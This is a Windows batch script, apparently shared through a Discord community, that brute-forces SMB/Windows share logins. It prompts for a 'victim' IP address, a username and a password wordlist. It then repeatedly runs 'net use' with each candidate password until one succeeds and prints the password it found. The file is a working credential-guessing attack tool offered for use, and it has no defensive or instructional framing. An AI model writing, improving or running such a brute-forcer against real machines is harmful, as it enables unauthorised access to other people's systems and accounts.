cls
@echo off
title Sunset-Bruteforce - by nthspecial
chcp 65001 >nul
:main
echo.
echo.
echo    [31m                       ███╗   ██╗████████╗██╗  ██╗██████╗ ██████╗ ██╗   ██╗████████╗███████╗[0m
echo    [38;2;255;51;0m                       ████╗  ██║╚══██╔══╝██║  ██║██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝[0m
echo    [38;2;255;102;0m                       ██╔██╗ ██║   ██║   ███████║██████╔╝██████╔╝██║   ██║   ██║   █████╗ [0m 
echo     [38;2;255;153;0m                      ██║╚██╗██║   ██║   ██╔══██║██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  [0m
echo     [38;2;255;204;0m                      ██║ ╚████║   ██║   ██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗[0m
echo    [1;93m                       ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝[0m
echo                                               visit discord.gg/e8XfWcdx66
echo.
echo.
set /p ip="[31mENTER VICTIM IP:[0m"
set /p user="[38;2;255;102;0mENTER VICTIM USER:[0m "
set /p wordlist="[1;93mENTER PASSWORD LIST:[0m "
set /a count = 1

for /f %%a in (%wordlist%) do (
	set pass=%%a
	call:attempt
)
echo PASSWORD NOT FOUND. TRY DIFFERENT PASSWORD LIST  
pause
exit 


:success
echo.
echo [32mPASSWORD FOUND! %pass%[0m
net use \\%ip% /d /y >nul 2>&1
pause 


:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [31m[ATTEMPT %count%] [%pass%][0m
set /a count=%count%+1 
if %errorlevel% EQU 0 goto success



